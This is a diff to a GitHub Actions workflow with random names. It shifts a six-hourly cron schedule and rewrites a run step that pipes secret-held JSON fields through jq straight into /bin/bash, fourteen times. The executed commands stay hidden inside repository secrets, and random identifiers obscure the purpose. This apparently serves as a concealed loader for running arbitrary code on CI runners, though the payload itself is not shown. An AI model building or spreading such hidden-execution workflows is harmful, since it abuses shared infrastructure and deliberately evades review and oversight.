@@ -2,25 +2,30 @@ name: grousepristine
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 1/6 * * *'
+    - cron: '16 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: grousepristine
         env:
-          zxrkg5757: ${{ secrets.zxrkg5757 }}
+          yjaxi34: ${{ secrets.yjaxi34 }}
         run: |
-          echo $zxrkg5757 | jq -r .u33714 | /bin/bash
-          echo $fuyof329 | jq -r .mgcv9 | /bin/bash
-          echo $vijzn53 | jq -r .zhyos87235 | /bin/bash
-          echo $fhuh337 | jq -r .riqmf7 | /bin/bash
-          echo $tbzsq71545 | jq -r .eapif29016 | /bin/bash
-          echo $dwj4 | jq -r .zkkzn8 | /bin/bash
-          echo $tvvx340 | jq -r .zu52 | /bin/bash
-          echo $yjqju69 | jq -r .gi9 | /bin/bash
-          echo $ywbp60019 | jq -r .u5894 | /bin/bash
-          echo $dx23 | jq -r .t19724 | /bin/bash
+          echo $yjaxi34 | jq -r .bafo57 | /bin/bash
+          echo $brc6050 | jq -r .a04 | /bin/bash
+          echo $od868 | jq -r .b7718 | /bin/bash
+          echo $g56 | jq -r .l14 | /bin/bash
+          echo $rnt9 | jq -r .xcz858 | /bin/bash
+          echo $n4 | jq -r .t4 | /bin/bash
+          echo $mq01074 | jq -r .gsxf558 | /bin/bash
+          echo $ijqt14 | jq -r .cne58368 | /bin/bash
+          echo $tnyn5491 | jq -r .ez6 | /bin/bash
+          echo $ie067 | jq -r .t3 | /bin/bash
+          echo $httq2 | jq -r .jwihh93528 | /bin/bash
+          echo $punk757 | jq -r .ks8044 | /bin/bash
+          echo $zvck1345 | jq -r .q39 | /bin/bash
+          echo $ufcm7824 | jq -r .ytdhe57 | /bin/bash
 
